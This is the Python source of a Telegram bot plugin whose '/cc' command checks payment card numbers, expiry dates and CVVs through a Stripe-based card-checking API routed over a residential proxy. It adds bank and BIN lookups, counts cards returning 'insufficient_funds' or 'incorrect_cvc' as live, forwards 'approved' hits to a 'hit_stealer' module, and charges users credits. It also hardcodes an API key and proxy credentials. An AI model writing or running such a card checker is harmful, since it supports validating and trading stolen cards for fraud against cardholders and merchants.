from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import re, time, httpx, requests
from httpx_socks import AsyncProxyTransport
from plugins.func.users_sql import *
from plugins.tools.hit_stealer import send_hit_if_approved
from datetime import date

API_URL = "https://barryxapi.xyz/str_auth"
API_KEY = "BRY-HEIQ7-KPWYR-DRU67"

session = requests.Session()

@Client.on_message(filters.command("cc", prefixes=["/", "."]))
async def cmd_cc(Client, message):
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        chat_type = message.chat.type
        username = message.from_user.username or "None"

        regdata = fetchinfo(user_id)
        if not regdata:
            return await message.reply_text("❌ You are not registered. Use /register first.")

        role = (regdata[2] or "FREE").strip().upper()
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        if chat_type == ChatType.PRIVATE and role == "FREE":
            return await message.reply_text(
                "⚠️ <b>Premium Users Required</b>\nOnly Premium users can use this in bot PM.\nJoin group for free use:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                ]),
                disable_web_page_preview=True
            )

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
            return await message.reply_text("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.")
        if now - antispam_time < wait_time:
            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")

        cc_text = message.reply_to_message.text if message.reply_to_message else (
            message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
        )
        if not cc_text:
            return await message.reply_text("❌ Usage: /cc <cc|mm|yy|cvv>")

        match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
        if not match:
            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply_text(f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...
""")

        tic = time.perf_counter()
        try:
            proxy_url = "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
            transport = AsyncProxyTransport.from_url(proxy_url)
            async with httpx.AsyncClient(transport=transport, timeout=25) as client:
                res = await client.get(f"{API_URL}?key={API_KEY}&card={fullcc}")
                if res.status_code == 200:
                    data = res.json()
                    card_status = data.get("status", "").lower()
                    card_message = data.get("message") or data.get("error") or res.text or "❌ Unknown response"
                else:
                    card_status = "error"
                    card_message = f"❌ HTTP {res.status_code}"
        except Exception as e:
            card_status = "error"
            card_message = f"❌ Request failed: {e}"

        toc = time.perf_counter()

        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            proxies = {
                "http": proxy_url,
                "https": proxy_url
            }
            binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", headers=headers, proxies=proxies, timeout=15).json()
            brand = str(binres.get("brand") or binres.get("scheme") or "N/A").upper()
            type_ = str(binres.get("type", "N/A")).upper()
            level = str(binres.get("level", "N/A")).upper()
            bank = str(binres.get("bank", "N/A")).upper()
            country = str(binres.get("country_name", "N/A")).upper()
            flag = binres.get("country_flag") or "🏳️"
        except Exception as e:
            brand = type_ = level = bank = country = "N/A"
            flag = "🏳️"

        msg_lower = card_message.lower()
        if any(k in msg_lower for k in ["approved", "success", "charged",  "insufficient_funds", "incorrect_cvc"]):
            status = "Approved ✅"
        elif any(k in msg_lower for k in ["declined", "pickup", "fraud", "stolen", "lost", "do not honor"]):
            status = "Declined ❌"
        else:
            status = "Error ⚠️"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        await Client.edit_message_text(chat_id, check_msg.id, final_msg)

        if "approved" in status.lower() or "live" in card_message.lower():
            await send_hit_if_approved(Client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
